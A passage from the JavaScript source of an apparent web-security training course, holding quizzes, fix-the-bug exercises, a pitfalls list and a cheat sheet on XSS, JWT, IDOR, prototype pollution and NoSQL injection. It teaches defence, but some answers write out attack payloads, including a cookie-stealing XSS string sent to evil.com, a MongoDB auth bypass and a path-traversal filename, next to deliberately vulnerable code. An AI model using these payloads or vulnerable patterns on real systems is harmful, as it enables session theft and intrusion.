    "Validates SSL certificates",
    "Blocks mixed content"
  ],
  correct: 1,
  explanation: "HSTS tells browsers to ONLY connect via HTTPS. After receiving the header, even if a user types http://, the browser automatically upgrades to HTTPS. This prevents SSL stripping attacks."
},
{
  q: "Which JWT vulnerability allows an attacker to forge tokens?",
  options: [
    "Setting the algorithm to 'none'",
    "Using a long expiration time",
    "Including the user's email in the payload",
    "Using HTTPS to transmit the token"
  ],
  correct: 0,
  explanation: "If a server doesn't validate the JWT algorithm, an attacker can set `alg: 'none'` and the token will be accepted without any signature verification. Always whitelist allowed algorithms."
},
{
  q: "What is prototype pollution in JavaScript?",
  options: [
    "Memory leak from too many objects",
    "An attack that modifies Object.prototype to affect all objects",
    "A performance issue with deep inheritance chains",
    "A garbage collection problem"
  ],
  correct: 1,
  explanation: "Prototype pollution allows attackers to inject properties into JavaScript's Object.prototype. Since all objects inherit from it, this can modify application behavior, bypass security checks, or achieve RCE."
},
{
  q: "During a security audit, what does SAST stand for?",
  options: [
    "Security Assessment and Scanning Tool",
    "Static Application Security Testing",
    "Server-side Authentication Security Test",
    "Secure Application Stack Testing"
  ],
  correct: 1,
  explanation: "SAST (Static Application Security Testing) analyzes source code without executing it. Tools like ESLint security plugins, Semgrep, and SonarQube scan code for vulnerability patterns."
},
{
  q: "Why should error messages in production NOT include stack traces?",
  options: [
    "Stack traces make errors harder to read",
    "They expose internal code structure, file paths, and dependencies to attackers",
    "They slow down the application",
    "They take up too much disk space in logs"
  ],
  correct: 1,
  explanation: "Stack traces reveal internal implementation details: file paths, library versions, function names, and code structure. Attackers use this information to craft targeted exploits."
},
{
  q: "What is the purpose of rate limiting on a login endpoint?",
  options: [
    "To improve page load speed",
    "To prevent brute force and credential stuffing attacks",
    "To save database resources",
    "To comply with GDPR"
  ],
  correct: 1,
  explanation: "Rate limiting restricts how many login attempts can be made in a time period. This prevents brute force attacks (trying many passwords) and credential stuffing (using leaked credential lists)."
},
{
  q: "What is SSRF (Server-Side Request Forgery)?",
  options: [
    "Forging SSL certificates on the server",
    "Making the server send requests to unintended internal resources",
    "Spoofing the server's IP address",
    "Injecting forged session tokens"
  ],
  correct: 1,
  explanation: "SSRF tricks the server into making requests to internal resources (like cloud metadata services at 169.254.169.254 or internal APIs) that the attacker can't reach directly."
},
{
  q: "Which CORS configuration is dangerous in production?",
  options: [
    "origin: ['https://myapp.com']",
    "origin: '*' with credentials: true",
    "origin: false",
    "origin: (origin, cb) => cb(null, allowList.includes(origin))"
  ],
  correct: 1,
  explanation: "`origin: '*'` with `credentials: true` allows any website to make authenticated requests to your API. Browsers actually block this exact combination, but reflecting the Origin header is equally dangerous."
},
{
  q: "In threat modeling, what is a 'trust boundary'?",
  options: [
    "The maximum number of users a system can handle",
    "A point where data crosses between different privilege/trust levels",
    "The physical boundary of the server room",
    "The expiration time of a trust certificate"
  ],
  correct: 1,
  explanation: "A trust boundary is where data moves between components with different trust levels (e.g., from user's browser to web server, or from web server to database). Each crossing is a potential attack surface."
},
{
  q: "What should you do FIRST when you discover a security vulnerability in production?",
  options: [
    "Immediately announce it publicly to warn users",
    "Rewrite the entire application from scratch",
    "Assess the severity and scope, then contain the issue",
    "Ignore it until the next sprint"
  ],
  correct: 2,
  explanation: "The first step in incident response is to assess the severity and scope, then contain the issue to prevent further damage. Public disclosure comes later, after a fix is in place."
}
];

// ============================================================
// EXERCISES
// ============================================================
const exercises = [
{
  id: 'ex1',
  title: 'Spot the XSS Vulnerability',
  difficulty: 'Medium',
  type: 'spot',
  code: `app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(\`
    <h1>Search Results for: \${query}</h1>
    <p>No results found.</p>
  \`);
});`,
  question: "What's the vulnerability and how would you fix it?",
  hints: ['What happens if the query contains HTML or script tags?', 'How is user input being rendered?'],
  answer: "The `query` parameter is directly interpolated into HTML without encoding. An attacker can send `?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>` to execute XSS.\n\n**Fix:** Encode the output:\n```\nconst escapeHtml = (s) => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');\nres.send(`<h1>Search Results for: ${escapeHtml(query)}</h1>`);\n```\nOr better: use a templating engine with auto-escaping."
},
{
  id: 'ex2',
  title: 'Fix the JWT Verification',
  difficulty: 'Hard',
  type: 'fix',
  code: `const jwt = require('jsonwebtoken');

function verifyToken(token) {
  try {
    const decoded = jwt.decode(token);
    if (decoded.exp > Date.now() / 1000) {
      return decoded;
    }
    return null;
  } catch(e) {
    return { guest: true, authenticated: false };
  }
}`,
  question: "This JWT verification has MULTIPLE critical flaws. Find and fix them all.",
  hints: ['jwt.decode() vs jwt.verify()', 'What about the algorithm?', 'What does the catch block return?'],
  answer: "**Flaw 1:** `jwt.decode()` does NOT verify the signature! Anyone can create a JWT with any payload. Must use `jwt.verify()`.\n\n**Flaw 2:** No algorithm whitelist ‚Äî vulnerable to 'alg: none' attack.\n\n**Flaw 3:** The catch block returns an object that might be treated as valid.\n\n**Fix:**\n```\nfunction verifyToken(token) {\n  try {\n    return jwt.verify(token, process.env.JWT_SECRET, {\n      algorithms: ['HS256'],\n      issuer: 'myapp',\n    });\n  } catch(e) {\n    return null; // Fail closed\n  }\n}\n```"
},
{
  id: 'ex3',
  title: 'Identify the IDOR',
  difficulty: 'Easy',
  type: 'spot',
  code: `// API endpoint
app.delete('/api/comments/:id', authMiddleware, async (req, res) => {
  const commentId = req.params.id;
  await db.query('DELETE FROM comments WHERE id = $1', [commentId]);
  res.json({ success: true });
});`,
  question: "Why is this endpoint insecure even though it has auth middleware?",
  hints: ['Who owns the comment being deleted?', 'Does the middleware check if the user owns this comment?'],
  answer: "**IDOR vulnerability:** The endpoint only checks if the user is logged in (authMiddleware), but doesn't verify if the logged-in user OWNS the comment. Any authenticated user can delete any comment by guessing/changing the ID.\n\n**Fix:**\n```\napp.delete('/api/comments/:id', authMiddleware, async (req, res) => {\n  const result = await db.query(\n    'DELETE FROM comments WHERE id = $1 AND user_id = $2',\n    [req.params.id, req.user.id]  // Add ownership check\n  );\n  if (result.rowCount === 0) {\n    return res.status(403).json({ error: 'Forbidden' });\n  }\n  res.json({ success: true });\n});\n```"
},
{
  id: 'ex4',
  title: 'CSP Header Construction',
  difficulty: 'Medium',
  type: 'build',
  question: "Write a Content-Security-Policy header value that:\n1. Only allows scripts from your own domain\n2. Allows styles from your domain and Google Fonts\n3. Allows images from anywhere over HTTPS\n4. Blocks all plugins (object/embed)\n5. Prevents the page from being framed\n6. Reports violations to /csp-report",
  hints: ['Use directives: script-src, style-src, img-src, object-src, frame-ancestors, report-uri'],
  answer: "```\nContent-Security-Policy: \n  default-src 'self'; \n  script-src 'self'; \n  style-src 'self' https://fonts.googleapis.com; \n  img-src 'self' https:; \n  object-src 'none'; \n  frame-ancestors 'none'; \n  report-uri /csp-report\n```\n\nNote: You might also need `font-src 'self' https://fonts.gstatic.com` for the actual font files, and `upgrade-insecure-requests` is a good addition."
},
{
  id: 'ex5',
  title: 'STRIDE Classification',
  difficulty: 'Medium',
  type: 'classify',
  question: "Classify each threat into the correct STRIDE category:",
  items: [
    { threat: "Attacker uses stolen session cookie to impersonate a user", answer: "Spoofing" },
    { threat: "Man-in-the-middle modifies API response data", answer: "Tampering" },
    { threat: "User makes a purchase but denies it later ‚Äî no logs exist", answer: "Repudiation" },
    { threat: "Error messages reveal database table names", answer: "Information Disclosure" },
    { threat: "Sending millions of requests to crash the server", answer: "Denial of Service" },
    { threat: "Regular user changes their JWT role claim to 'admin'", answer: "Elevation of Privilege" }
  ],
  answer: "1. **Spoofing** ‚Äî Impersonation using stolen credentials\n2. **Tampering** ‚Äî Modifying data integrity\n3. **Repudiation** ‚Äî Denying actions without audit trail\n4. **Information Disclosure** ‚Äî Leaking confidential info\n5. **Denial of Service** ‚Äî Overwhelming availability\n6. **Elevation of Privilege** ‚Äî Gaining unauthorized access level"
},
{
  id: 'ex6',
  title: 'Fix the Prototype Pollution',
  difficulty: 'Hard',
  type: 'fix',
  code: `function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Usage: merge user settings
const defaults = { theme: 'dark', lang: 'en' };
const userPrefs = JSON.parse(req.body);
merge(defaults, userPrefs);`,
  question: "This merge function is vulnerable to prototype pollution. How?",
  hints: ['What if the source object contains __proto__?', 'What happens when you set properties on __proto__?'],
  answer: "If an attacker sends `{\"__proto__\": {\"isAdmin\": true}}`, the merge function will set `Object.prototype.isAdmin = true`, affecting ALL objects.\n\n**Fix:**\n```\nfunction safeMerge(target, source) {\n  for (let key in source) {\n    // Block prototype pollution vectors\n    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n      continue;\n    }\n    if (source.hasOwnProperty(key)) {\n      if (typeof source[key] === 'object' && source[key] !== null) {\n        if (!target[key]) target[key] = {};\n        safeMerge(target[key], source[key]);\n      } else {\n        target[key] = source[key];\n      }\n    }\n  }\n  return target;\n}\n```\nOr use `Object.create(null)` for objects that shouldn't have prototypes."
},
{
  id: 'ex7',
  title: 'Spot the NoSQL Injection',
  difficulty: 'Medium',
  type: 'spot',
  code: `// MongoDB login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  
  if (user) {
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});`,
  question: "How can an attacker bypass authentication here?",
  hints: ['What if password is not a string?', 'MongoDB query operators like $gt, $ne'],
  answer: "An attacker sends: `{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}`\n\nMongoDB interprets `{\"$ne\": \"\"}` as 'password is not empty string' ‚Äî which is true for all users!\n\nOr: `{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}` returns any user.\n\n**Fix:**\n```\n// 1. Validate types\nif (typeof username !== 'string' || typeof password !== 'string') {\n  return res.status(400).json({ error: 'Invalid input' });\n}\n\n// 2. NEVER compare raw passwords! Use bcrypt\nconst user = await db.collection('users').findOne({ username });\nif (user && await bcrypt.compare(password, user.hashedPassword)) {\n  res.json({ token: generateToken(user) });\n}\n```"
},
{
  id: 'ex8',
  title: 'Security Header Analysis',
  difficulty: 'Easy',
  type: 'analyze',
  code: `HTTP/1.1 200 OK
Server: Apache/2.4.41
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Set-Cookie: session=abc123; Path=/

<!DOCTYPE html>...`,
  question: "List ALL the security issues with these HTTP response headers.",
  hints: ['What headers are MISSING?', 'What headers SHOULDN\'T be there?', 'What about the cookie?'],
  answer: "**Issues found:**\n\n1. ‚ùå `Server: Apache/2.4.41` ‚Äî Reveals server version (info disclosure)\n2. ‚ùå `X-Powered-By: Express` ‚Äî Reveals framework (info disclosure)\n3. ‚ùå Cookie missing `HttpOnly` flag ‚Äî JS can steal it via XSS\n4. ‚ùå Cookie missing `Secure` flag ‚Äî Sent over HTTP too\n5. ‚ùå Cookie missing `SameSite` flag ‚Äî CSRF vulnerable\n6. ‚ùå Missing `Content-Security-Policy` header\n7. ‚ùå Missing `Strict-Transport-Security` header\n8. ‚ùå Missing `X-Content-Type-Options: nosniff`\n9. ‚ùå Missing `X-Frame-Options` header\n10. ‚ùå Missing `Referrer-Policy` header\n\n**Fix:** Remove Server/X-Powered-By, add all security headers, fix cookie flags."
},
{
  id: 'ex9',
  title: 'Threat Model a File Upload',
  difficulty: 'Hard',
  type: 'build',
  question: "You're building a file upload feature for profile pictures. Perform a mini threat model:\n1. List at least 5 threats\n2. Classify each using STRIDE\n3. Propose a mitigation for each",
  hints: ['Think about: file types, file sizes, file names, storage location, processing'],
  answer: "**Threats:**\n\n1. **[T] Tampering:** Uploading a .exe renamed as .jpg\n   ‚Üí Mitigation: Check magic bytes, not just extension\n\n2. **[E] Elevation:** Upload a PHP/JS webshell\n   ‚Üí Mitigation: Store outside webroot, serve via CDN\n\n3. **[D] DoS:** Upload extremely large files\n   ‚Üí Mitigation: Set size limits, stream processing\n\n4. **[I] Info Disclosure:** EXIF data contains GPS location\n   ‚Üí Mitigation: Strip metadata with sharp/imagemagick\n\n5. **[T] Tampering:** Path traversal in filename: `../../etc/passwd`\n   ‚Üí Mitigation: Generate random filenames, ignore user-provided name\n\n6. **[D] DoS:** Zip bomb (tiny file expands to TB)\n   ‚Üí Mitigation: Set decompression limits\n\n7. **[I] Info Disclosure:** Predictable file URLs allow enumeration\n   ‚Üí Mitigation: Use UUID filenames, signed URLs"
},
{
  id: 'ex10',
  title: 'Rate Limiter Implementation',
  difficulty: 'Medium',
  type: 'fix',
  code: `// Login endpoint - no rate limiting
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findByEmail(email);
  
  if (!user) {
    return res.status(401).json({ error: 'User not found' });
  }
  
  if (!await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Wrong password' });
  }
  
  const token = jwt.sign({ id: user.id }, SECRET);
  res.json({ token });
});`,
  question: "This login has multiple security issues beyond rate limiting. Find them all and write a secure version.",
  hints: ['Error messages', 'Token configuration', 'Brute force protection', 'Timing attacks'],
  answer: "**Issues:**\n1. No rate limiting ‚Üí brute force possible\n2. Different error messages for 'user not found' vs 'wrong password' ‚Üí username enumeration\n3. JWT has no expiration\n4. No algorithm specified in JWT\n5. Timing attack: returning early when user not found is faster than bcrypt comparison\n\n**Secure version:**\n```\nconst rateLimit = require('express-rate-limit');\n\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5,\n  message: 'Too many attempts'\n});\n\napp.post('/api/login', loginLimiter, async (req, res) => {\n  const { email, password } = req.body;\n  const user = await User.findByEmail(email);\n  \n  // Always run bcrypt even if user not found (timing attack prevention)\n  const dummyHash = '$2b$12$dummy.hash.for.timing.attack.prevention';\n  const isValid = await bcrypt.compare(\n    password,\n    user ? user.password : dummyHash\n  );\n  \n  if (!user || !isValid) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n  \n  const token = jwt.sign({ id: user.id }, SECRET, {\n    algorithm: 'HS256',\n    expiresIn: '15m'\n  });\n  res.json({ token });\n});\n```"
}
];

// ============================================================
// PITFALLS
// ============================================================
const pitfalls = [
{
  title: "Using innerHTML with user input",
  severity: "CRITICAL",
  wrong: `element.innerHTML = '<div>' + userInput + '</div>';`,
  right: `element.textContent = userInput;\n// Or use DOMPurify:\nelement.innerHTML = DOMPurify.sanitize(userInput);`,
  explanation: "innerHTML parses content as HTML. If userInput contains `<script>` or event handlers, they execute. Always use textContent for text or DOMPurify for rich content."
},
{
  title: "Storing secrets in frontend code",
  severity: "CRITICAL",
  wrong: `const API_KEY = 'sk_live_abc123def456';\nconst DB_PASSWORD = 'supersecret';`,
  right: `// Keep secrets server-side only\n// Use environment variables\nconst apiKey = process.env.API_KEY;\n\n// Frontend only gets public/limited tokens\nconst publicKey = 'pk_live_xxx'; // OK - designed to be public`,
  explanation: "ALL frontend JavaScript is visible to users. Never put API keys, passwords, or secrets in client-side code. Even in minified/bundled code, they're extractable."
},
{
  title: "Using jwt.decode() instead of jwt.verify()",
  severity: "CRITICAL",
  wrong: `const payload = jwt.decode(token);\nif (payload.role === 'admin') { /* grant access */ }`,
  right: `const payload = jwt.verify(token, SECRET, {\n  algorithms: ['HS256']\n});\nif (payload.role === 'admin') { /* grant access */ }`,
  explanation: "jwt.decode() does NOT verify the signature. Anyone can create a JWT with any payload. Always use jwt.verify() with explicit algorithm whitelist."
},
{
  title: "Different error messages for auth failures",
  severity: "HIGH",
  wrong: `if (!user) return res.json({ error: 'User not found' });\nif (!validPw) return res.json({ error: 'Wrong password' });`,
  right: `if (!user || !validPw) {\n  return res.json({ error: 'Invalid credentials' });\n}`,
  explanation: "Different messages let attackers enumerate valid usernames. Use the same generic message for all authentication failures."
},
{
  title: "Missing CSRF protection",
  severity: "HIGH",
  wrong: `// Cookie-based auth with no CSRF protection\napp.post('/transfer', auth, (req, res) => {\n  transfer(req.user, req.body.to, req.body.amount);\n});`,
  right: `// Use SameSite cookies + CSRF tokens\nres.cookie('session', token, { sameSite: 'Strict' });\n\n// Or use custom headers (can't be sent cross-origin)\napp.post('/transfer', auth, csrfProtection, handler);`,
  explanation: "Without CSRF protection, a malicious website can make your browser submit requests to your API using your cookies. SameSite=Strict cookies + CSRF tokens prevent this."
},
{
  title: "Trusting client-side validation only",
  severity: "HIGH",
  wrong: `// Only validate in the browser\n<form onsubmit="if(isValid()) submit()">\n\n// Server trusts everything\napp.post('/data', (req, res) => {\n  db.save(req.body); // No server validation!\n});`,
  right: `// Server ALWAYS validates\napp.post('/data', (req, res) => {\n  const { error, value } = schema.validate(req.body);\n  if (error) return res.status(400).json({ error });\n  db.save(value);\n});`,
  explanation: "Client-side validation is a UX convenience. Attackers bypass it trivially with curl/Postman. ALL validation must be duplicated server-side."
},
{
  title: "Logging sensitive data",
  severity: "HIGH",
  wrong: `console.log('Login attempt:', { email, password });\nlogger.info('Payment:', { cardNumber, cvv });`,
  right: `logger.info('Login attempt:', { email, success: false });\nlogger.info('Payment:', { last4: card.slice(-4), status });`,
  explanation: "Logs are often stored in plain text and accessed by many people. Never log passwords, tokens, credit cards, or other sensitive data."
},
{
  title: "Using Math.random() for security",
  severity: "HIGH",
  wrong: `const token = Math.random().toString(36).substr(2);\nconst resetCode = Math.floor(Math.random() * 999999);`,
  right: `const crypto = require('crypto');\nconst token = crypto.randomBytes(32).toString('hex');\n// Browser: crypto.getRandomValues(new Uint8Array(32));`,
  explanation: "Math.random() is NOT cryptographically secure ‚Äî its output can be predicted. Use crypto.randomBytes() (Node) or crypto.getRandomValues() (browser) for security-sensitive values."
},
{
  title: "SQL injection via string concatenation",
  severity: "CRITICAL",
  wrong: `const query = "SELECT * FROM users WHERE id = " + userId;\ndb.query(query);`,
  right: `db.query('SELECT * FROM users WHERE id = $1', [userId]);`,
  explanation: "String concatenation in SQL queries is the #1 cause of SQL injection. Always use parameterized queries / prepared statements."
},
{
  title: "Exposing stack traces in production",
  severity: "MEDIUM",
  wrong: `app.use((err, req, res, next) => {\n  res.status(500).json({\n    error: err.message,\n    stack: err.stack  // Reveals internals!\n  });\n});`,
  right: `app.use((err, req, res, next) => {\n  logger.error(err); // Log full details internally\n  res.status(500).json({\n    error: 'Internal server error',\n    id: req.requestId  // Reference for support\n  });\n});`,
  explanation: "Stack traces reveal file paths, library versions, and code structure. Log them internally but never expose them to users."
},
{
  title: "Forgetting to set security headers",
  severity: "MEDIUM",
  wrong: `// Just serving content with no headers\napp.get('/', (req, res) => {\n  res.sendFile('index.html');\n});`,
  right: `const helmet = require('helmet');\napp.use(helmet()); // Sets many security headers\n\n// Plus custom headers\napp.use((req, res, next) => {\n  res.setHeader('Permissions-Policy', 'camera=()');\n  next();\n});`,
  explanation: "Without security headers, browsers use permissive defaults. Use helmet.js as a baseline and add custom headers for your needs."
},
{
  title: "Not validating redirect URLs",
  severity: "HIGH",
  wrong: `// Open redirect vulnerability\napp.get('/redirect', (req, res) => {\n  res.redirect(req.query.url);\n  // Attacker: /redirect?url=https://evil.com\n});`,
  right: `const allowedDomains = ['myapp.com', 'docs.myapp.com'];\n\napp.get('/redirect', (req, res) => {\n  const url = new URL(req.query.url);\n  if (allowedDomains.includes(url.hostname)) {\n    res.redirect(url.toString());\n  } else {\n    res.redirect('/');\n  }\n});`,
  explanation: "Open redirects are used in phishing attacks ‚Äî the URL starts with your trusted domain but redirects to an attacker's site. Always validate redirect destinations against a whitelist."
}
];

// ============================================================
// CHEAT SHEET DATA
// ============================================================
const cheatSheet = {
  headers: [
    { name: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'", purpose: 'Controls resource loading' },
    { name: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains; preload', purpose: 'Force HTTPS' },
    { name: 'X-Content-Type-Options', value: 'nosniff', purpose: 'Prevent MIME sniffing' },
    { name: 'X-Frame-Options', value: 'DENY', purpose: 'Prevent clickjacking' },
    { name: 'Referrer-Policy', value: 'strict-origin-when-cross-origin', purpose: 'Control referrer info' },
    { name: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()', purpose: 'Disable browser APIs' },
    { name: 'Cross-Origin-Opener-Policy', value: 'same-origin', purpose: 'Isolate browsing context' },
  ],
  cookieFlags: [
    { flag: 'HttpOnly', purpose: 'Prevent JS access (XSS protection)' },
    { flag: 'Secure', purpose: 'HTTPS only transmission' },
    { flag: 'SameSite=Strict', purpose: 'Prevent CSRF' },
    { flag: 'Path=/', purpose: 'Limit cookie scope' },
    { flag: 'Max-Age=900', purpose: 'Short expiration (15min)' },
  ],
  stride: [
    { letter: 'S', name: 'Spoofing', property: 'Authentication', question: 'Can someone pretend to be someone else?' },
    { letter: 'T', name: 'Tampering', property: 'Integrity', question: 'Can data be modified inappropriately?' },
    { letter: 'R', name: 'Repudiation', property: 'Non-repudiation', question: 'Can actions be denied without proof?' },
    { letter: 'I', name: 'Info Disclosure', property: 'Confidentiality', question: 'Can data be seen by unauthorized users?' },
    { letter: 'D', name: 'Denial of Service', property: 'Availability', question: 'Can the system be made unavailable?' },
    { letter: 'E', name: 'Elev. of Privilege', property: 'Authorization', question: 'Can someone gain unauthorized access?' },
  ],
  quickFixes: [
    { vuln: 'XSS', fix: 'textContent, DOMPurify, CSP' },
    { vuln: 'SQL Injection', fix: 'Parameterized queries' },
    { vuln: 'CSRF', fix: 'SameSite cookies + CSRF tokens' },
    { vuln: 'IDOR', fix: 'Check ownership on every request' },
    { vuln: 'Clickjacking', fix: 'X-Frame-Options: DENY + CSP frame-ancestors' },
    { vuln: 'Open Redirect', fix: 'Whitelist allowed redirect domains' },
    { vuln: 'SSRF', fix: 'Whitelist allowed URLs, block internal IPs' },
    { vuln: 'Prototype Pollution', fix: 'Block __proto__, constructor, prototype keys' },
    { vuln: 'JWT Tampering', fix: "jwt.verify() + algorithms whitelist, never decode()" },
    { vuln: 'Brute Force', fix: 'Rate limiting + account lockout + CAPTCHA' },
  ]
};

// ============================================================
// RENDER FUNCTIONS
// ============================================================

function renderSidebar(){
  const sb=document.getElementById('sidebar');
  const progress=getProgress();
  sb.innerHTML=`
    <div class="logo"><h2><span>üîê</span> JS Security</h2><p>Advanced Course</p></div>
    <div class="nav-section">Learn</div>
    ${lessons.map((l,i)=>`
      <button class="${state.section==='learn'&&state.lesson===i?'active':''}" onclick="navigate('learn',${i})">
        <span class="icon">${l.icon}</span>
        <span>${l.title}</span>
        ${state.completed['lesson_'+i]?'<span style="margin-left:auto">‚úÖ</span>':''}
      </button>
    `).join('')}
    <div class="nav-section">Practice</div>
    <button class="${state.section==='practice'?'active':''}" onclick="navigate('practice')">
      <span class="icon">üíª</span><span>Exercises (${exercises.length})</span>
    </button>
    <button class="${state.section==='quiz'?'active':''}" onclick="navigate('quiz')">
      <span class="icon">üß™</span><span>Quiz (${quizQuestions.length}Q)</span>
    </button>
    <div class="nav-section">Reference</div>
    <button class="${state.section==='pitfalls'?'active':''}" onclick="navigate('pitfalls')">
      <span class="icon">‚ö†Ô∏è</span><span>Pitfalls (${pitfalls.length})</span>
    </button>
    <button class="${state.section==='cheatsheet'?'active':''}" onclick="navigate('cheatsheet')">
      <span class="icon">üìã</span><span>Cheat Sheet</span>
    </button>
    <div class="progress-wrap">
      <div style="font-size:12px;color:var(--text2)">Progress</div>
      <div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div>
      <div class="progress-text">${progress}% complete</div>
    </div>
  `;
  document.getElementById('xpDisplay').textContent=state.xp;
}

function navigate(section, lesson){
  state.section=section;
  if(typeof lesson==='number') state.lesson=lesson;
  state.subTab=0;
  renderSidebar();
  renderContent();
  window.scrollTo(0,0);
}

function renderContent(){
  const main=document.getElementById('content');
  main.className='fade-in';
  switch(state.section){
    case 'learn': renderLesson(main); break;
    case 'practice': renderPractice(main); break;
    case 'quiz': renderQuiz(main); break;
    case 'pitfalls': renderPitfalls(main); break;
    case 'cheatsheet': renderCheatSheet(main); break;
  }
}

function renderLesson(main){
  const lesson=lessons[state.lesson];
  main.innerHTML=lesson.content+`
    <div class="lesson-nav">
      ${state.lesson>0?`<button class="btn btn-outline" onclick="navigate('learn',${state.lesson-1})">‚Üê Previous</button>`:'<span></span>'}
      <button class="btn btn-success" onclick="markDone('lesson_${state.lesson}');${state.lesson<lessons.length-1?`navigate('learn',${state.lesson+1})`:`navigate('practice')`}">
        ${state.completed['lesson_'+state.lesson]?'‚úÖ Completed':'Mark Complete & Continue ‚Üí'}
      </button>
    </div>
  `;
}

function renderPractice(main){
  main.innerHTML=`
    <h1>üíª Practice Exercises</h1>
    <p class="subtitle">Apply your security knowledge with hands-on challenges</p>
    <div class="score-display">Completed: ${exercises.filter((_,i)=>state.completed['ex_'+i]).length} / ${exercises.length}</div>
    ${exercises.map((ex,i)=>renderExercise(ex,i)).join('')}
  `;
}

function renderExercise(ex, i){
  const done=state.completed['ex_'+i];
  const showAnswer=state.exerciseResults['show_'+i];
  return `
    <div class="card ${done?'card-success':''}" id="exercise-${i}">
      <div class="card-title">
        ${done?'‚úÖ':'üîπ'} Exercise ${i+1}: ${ex.title}
        <span class="tag tag-${ex.difficulty==='Easy'?'green':ex.difficulty==='Medium'?'amber':'red'}">${ex.difficulty}</span>
      </div>
      ${ex.code?`<pre><code>${escapeHtml(ex.code)}</code></pre>`:''}
      <p><strong>${ex.question}</strong></p>
      ${ex.items?`
        <div style="margin:12px 0">
          ${ex.items.map((item,j)=>`
            <div style="display:flex;align-items:center;gap:10px;margin:6px 0">
              <span style="font-size:13px;flex:1">${item.threat}</span>
              <select id="stride_${i}_${j}" style="padding:4px 8px;background:var(--surface2);color:var(--text);border:1px solid var(--border);border-radius:4px;font-size:12px" onchange="checkStride(${i})">
                <option value="">Select...</option>
                <option>Spoofing</option><option>Tampering</option><option>Repudiation</option>
                <option>Information Disclosure</option><option>Denial of Service</option><option>Elevation of Privilege</option>
              </select>
            </div>
          `).join('')}
        </div>
      `:''}
      <div class="btn-row">
        ${ex.hints?`<button class="btn btn-outline btn-sm" onclick="showHints(${i})">üí° Show Hints</button>`:''}
        <button class="btn btn-primary btn-sm" onclick="toggleAnswer(${i})">
          ${showAnswer?'Hide':'Show'} Solution
        </button>
        ${!done?`<button class="btn btn-success btn-sm" onclick="markDone('ex_'+${i});renderContent()">‚úÖ Mark Done</button>`:''}
      </div>
      <div id="hints-${i}" style="display:none" class="card card-amber" style="margin-top:10px">
        <div class="card-title">üí° Hints</div>
        ${ex.hints?`<ul>${ex.hints.map(h=>`<li>${h}</li>`).join('')}</ul>`:''}
      </div>
      <div id="answer-${i}" style="display:${showAnswer?'block':'none'}" class="card card-success" style="margin-top:10px">
        <div class="card-title">‚úÖ Solution</div>
        <div style="font-size:13px;white-space:pre-wrap">${formatAnswer(ex.answer)}</div>
      </div>
    </div>
  `;
}

function formatAnswer(text){
  return text
    .replace(/```([\s\S]*?)```/g, '<pre><code>$1</code></pre>')
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
    .replace(/\n/g, '<br>');
}

function showHints(i){
  const el=document.getElementById('hints-'+i);
  el.style.display=el.style.display==='none'?'block':'none';
}

function toggleAnswer(i){
  state.exerciseResults['show_'+i]=!state.exerciseResults['show_'+i];
  const el=document.getElementById('answer-'+i);
  el.style.display=state.exerciseResults['show_'+i]?'block':'none';
}

function checkStride(exIdx){
  const ex=exercises[exIdx];
  if(!ex.items)return;
  let allCorrect=true;
  ex.items.forEach((item,j)=>{
    const sel=document.getElementById(`stride_${exIdx}_${j}`);
    if(sel.value!==item.answer) allCorrect=false;
  });
  if(allCorrect){markDone('ex_'+exIdx);addXP(5);}
}

function renderQuiz(main){
  const answered=Object.keys(state.quizAnswers).length;
  const correct=Object.values(state.quizAnswers).filter(a=>a.correct).length;
  
  main.innerHTML=`
    <h1>üß™ Security Knowledge Quiz</h1>
    <p class="subtitle">Test your understanding ‚Äî ${quizQuestions.length} questions covering all topics</p>
    <div class="score-display">Score: ${correct} / ${answered} answered${answered===quizQuestions.length?` (${Math.round(correct/quizQuestions.length*100)}%)`:''}  </div>
    ${answered===quizQuestions.length?`
      <div class="card card-${correct/quizQuestions.length>=0.8?'success':'warn'}">
        <div class="card-title">${correct/quizQuestions.length>=0.8?'üéâ Great job!':'üìö Keep studying!'}</div>
        <p>You got ${correct} out of ${quizQuestions.length} correct (${Math.round(correct/quizQuestions.length*100)}%).</p>
        <button class="btn btn-primary btn-sm" onclick="state.quizAnswers={};renderContent()">üîÑ Retake Quiz</button>
      </div>
    `:''}
    ${quizQuestions.map((q,i)=>renderQuizQuestion(q,i)).join('')}
  `;
}

function renderQuizQuestion(q, i){
  const answered=state.quizAnswers[i];
  return `
    <div class="card" id="quiz-${i}" style="border-left:4px solid ${answered?answered.correct?'var(--accent2)':'var(--danger)':'var(--surface3)'}">
      <div class="card-title">Question ${i+1} of ${quizQuestions.length}</div>
      <p><strong>${q.q}</strong></p>
      ${q.options.map((opt,j)=>`
        <button class="quiz-option ${answered?j===q.correct?'correct':j===answered.selected?'wrong':'reveal':''}"
          onclick="answerQuiz(${i},${j})" ${answered?'disabled':''}>
          ${String.fromCharCode(65+j)}. ${opt}
        </button>
      `).join('')}
      <div class="quiz-feedback ${answered?'show':''} ${answered?answered.correct?'correct-fb':'wrong-fb':''}">
        ${answered?answered.correct?'‚úÖ Correct! ':'‚ùå Incorrect. ':''}${answered?q.explanation:''}
      </div>
    </div>
  `;
}

function answerQuiz(qi, oi){
